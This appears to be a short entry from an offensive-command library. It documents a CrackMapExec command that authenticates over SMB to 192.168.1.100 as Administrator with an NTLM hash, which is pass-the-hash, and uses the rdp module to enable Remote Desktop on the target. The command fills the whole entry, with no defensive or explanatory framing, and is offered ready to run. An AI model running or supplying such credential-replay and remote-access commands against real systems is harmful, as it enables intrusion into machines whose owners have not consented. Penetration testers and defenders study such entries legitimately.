---
id: b62c5b8a-e759-481a-8512-7584139f36f7
name: Execute smb module with RDP module and enable action
type: command
executor: bash
data: root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f
  -M rdp -o ACTION=enable
output: null
created_at: '2023-04-06T03:56:01.851515+00:00'
updated_at: '2023-04-10T20:25:48.419627+00:00'
---

# Execute smb module with RDP module and enable action

```bash
root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
```
